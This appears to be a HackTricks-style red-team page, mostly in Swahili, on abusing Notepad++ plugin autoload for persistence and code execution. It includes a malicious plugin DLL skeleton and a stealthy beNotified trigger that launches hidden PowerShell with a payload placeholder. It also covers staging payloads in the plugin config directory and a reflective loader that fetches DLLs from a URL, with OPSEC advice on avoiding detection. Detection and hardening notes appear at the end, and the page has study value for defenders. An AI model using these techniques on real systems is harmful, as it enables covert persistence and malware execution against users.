# Notepad++ Plugin Autoload Persistence & Execution

{{#include ../../banners/hacktricks-training.md}}

Notepad++ itafanya **autoload kila plugin DLL inayopatikana chini ya subfolders zake za `plugins`** wakati wa kuanzishwa. Kuweka malicious plugin ndani ya **any writable Notepad++ installation** kunatoa code execution ndani ya `notepad++.exe` kila editor inapoanza, jambo ambalo linaweza kutumiwa kwa **persistence**, stealthy **initial execution**, au kama **in-process loader** ikiwa editor imeanzishwa elevated.

Tangu **Notepad++ 7.6+** layout inayotarajiwa ya manual-install ni **subfolder moja kwa kila plugin** (`plugins\<PluginName>\<PluginName>.dll`). Katika **portable mode** (uwepo wa `doLocalConf.xml` kando ya `notepad++.exe`), tree nzima ya application hubaki local kwa directory hiyo, jambo ambalo mara nyingi hugeuza copied/admin tool bundles kuwa easy user-writable execution surface.

## Writable plugin locations
- Standard install: `C:\Program Files\Notepad++\plugins\<PluginName>\<PluginName>.dll` (kawaida huhitaji admin kuandika).
- Writable options for low-privileged operators:
- Tumia **portable Notepad++ build** katika folder inayoweza kuandikwa na user.
- Nakili `C:\Program Files\Notepad++` kwenda kwenye path inayodhibitiwa na user (mfano `%LOCALAPPDATA%\npp\`) na endesha `notepad++.exe` kutoka hapo.
- Tafuta **admin tool bundles**, copies zilizotolewa kutoka zip, au help-desk toolkits ambazo tayari zina `doLocalConf.xml` na ziko nje ya `Program Files`.
- Kila plugin hupata subfolder yake chini ya `plugins` na hupakiwa automatically wakati wa startup; menu entries huonekana chini ya **Plugins**.

Quick triage:
```cmd
where /r C:\ notepad++.exe 2>nul
for /d %D in ("%ProgramFiles%\Notepad++" "%ProgramFiles(x86)%\Notepad++" "%LOCALAPPDATA%\*notepad*" "%USERPROFILE%\Desktop\*notepad*") do @if exist "%~fD\plugins" echo [*] %~fD
icacls "C:\Program Files\Notepad++\plugins" 2>nul
```
## Plugin load points (execution primitives)
Notepad++ inatarajia **exported functions** maalum. Haya yote huitwa wakati wa initialization, yakitoa sehemu nyingi za execution:
- **`DllMain`** — huendeshwa mara moja DLL inapopakiwa (first execution point).
- **`setInfo(NppData)`** — huitwa mara moja wakati wa load ili kutoa Notepad++ handles; mahali pa kawaida pa kusajili menu items.
- **`getName()`** — hurudisha jina la plugin linaloonyeshwa kwenye menu.
- **`getFuncsArray(int *nbF)`** — hurudisha menu commands; hata kama ni tupu, huitwa wakati wa startup.
- **`beNotified(SCNotification*)`** — hupokea Notepad++ / Scintilla events (inafaa kuchelewesha payloads hadi user action au editor event).
- **`messageProc(UINT, WPARAM, LPARAM)`** — message handler, inafaa kwa data exchanges kubwa zaidi.
- **`isUnicode()`** — compatibility flag inayokaguliwa wakati wa load.

Exports nyingi zinaweza kutekelezwa kama **stubs**; execution inaweza kufanyika kutoka `DllMain` au callback yoyote hapo juu wakati wa autoload.

## Minimal malicious plugin skeleton
Compile DLL yenye expected exports na uweke kwenye `plugins\\MyNewPlugin\\MyNewPlugin.dll` chini ya writable Notepad++ folder:
```c
BOOL APIENTRY DllMain(HMODULE h, DWORD r, LPVOID) { if (r == DLL_PROCESS_ATTACH) MessageBox(NULL, TEXT("Hello from Notepad++"), TEXT("MyNewPlugin"), MB_OK); return TRUE; }
extern "C" __declspec(dllexport) void setInfo(NppData) {}
extern "C" __declspec(dllexport) const TCHAR *getName() { return TEXT("MyNewPlugin"); }
extern "C" __declspec(dllexport) FuncItem *getFuncsArray(int *nbF) { *nbF = 0; return NULL; }
extern "C" __declspec(dllexport) void beNotified(SCNotification *) {}
extern "C" __declspec(dllexport) LRESULT messageProc(UINT, WPARAM, LPARAM) { return TRUE; }
extern "C" __declspec(dllexport) BOOL isUnicode() { return TRUE; }
```
1. Build the DLL (Visual Studio/MinGW).
2. Create the plugin subfolder under `plugins` and drop the DLL inside.
3. Restart Notepad++; the DLL is loaded automatically, executing `DllMain` and subsequent callbacks.

## Low-noise trigger pattern via `beNotified`
Kwa OPSEC, payload nyingi hazipaswi **kuzinduka** kutoka `DllMain`. Muundo wa kimya zaidi ni kuacha plugin ipakie kwa usahihi, kisha itekelezwe tu baada ya tukio la kweli la editor kama **startup complete**, **buffer activation**, au **herufi ya kwanza iliyochapwa**.
```c
static bool fired = false;
extern "C" __declspec(dllexport) void beNotified(SCNotification *n) {
if (fired) return;
if (n->nmhdr.code == NPPN_READY ||
n->nmhdr.code == NPPN_BUFFERACTIVATED ||
n->nmhdr.code == SCN_CHARADDED) {
fired = true;
WinExec("powershell -w hidden -nop -c <payload>", SW_HIDE);
}
}
```
Hii inalingana zaidi na public offensive research kuliko `DllMain` beacon yenye kelele: DLL bado inaautoloadiwa wakati wa startup, lakini hatua mbaya hucheleweshwa hadi Notepad++ ionekane kweli inatumika.

## Kutumia plugin config directory kama secondary storage
Notepad++ hutoa `NPPM_GETPLUGINSCONFIGDIR`, ambayo hurejesha **plugin configuration directory ya mtumiaji wa sasa**. Plugin mbaya inaweza kutumia hili kuweka DLL iliyoko kwenye disk ikiwa ndogo huku ikihifadhi encrypted config, staged payloads, au tasking files katika path ambayo inaendana na hali ya kawaida ya plugin.
```c
wchar_t cfg[MAX_PATH] = {0};
SendMessage(nppData._nppHandle, NPPM_GETPLUGINSCONFIGDIR, MAX_PATH, (LPARAM)cfg);
// Example result: %AppData%\Notepad++\plugins\config
```
Kiutendaji hili ni muhimu unapotaka:
- tiny autoloaded bootstrap DLL;
- per-user tasking bila kugusa tena main plugin binary;
- kutenganisha **autoload trigger** kutoka kwenye heavier second stage.

## Reflective loader plugin pattern
A weaponized plugin inaweza kugeuza Notepad++ kuwa **reflective DLL loader**:
- Present a minimal UI/menu entry (e.g., "LoadDLL").
- Accept a **file path** or **URL** to fetch a payload DLL.
- Reflectively map the DLL into the current process and invoke an exported entry point (e.g., a loader function inside the fetched DLL).
- Benefit: reuse a benign-looking GUI process instead of spawning a new loader; payload inherits the integrity of `notepad++.exe` (including elevated contexts).
- Trade-offs: dropping an **unsigned plugin DLL** to disk is noisy; a practical variation is to use the autoloaded plugin only as a stub and keep the real implant encrypted/staged elsewhere.

## Detection and hardening notes
- Block or monitor **writes to Notepad++ plugin directories** (including portable copies in user profiles); enable controlled folder access or application allowlisting.
- Alert on **new unsigned DLLs** under `plugins`, changes to portable Notepad++ trees, and unusual **child processes/network activity** from `notepad++.exe`.
- Baseline legitimate plugins and investigate any new DLL that exports the normal Notepad++ plugin interface but also spawns shells, PowerShell, or network beacons.
- Enforce plugin installation via **Plugins Admin** only, and restrict execution of portable copies from untrusted paths.

## References
- [TrustedSec - Notepad++ Plugins: Plug and Payload](https://trustedsec.com/blog/notepad-plugins-plug-and-payload)
- [Notepad++ User Manual - Plugins](https://npp-user-manual.org/docs/plugins/)
- [Notepad++ User Manual - Plugin Communication](https://npp-user-manual.org/docs/plugin-communication/)

{{#include ../../banners/hacktricks-training.md}}
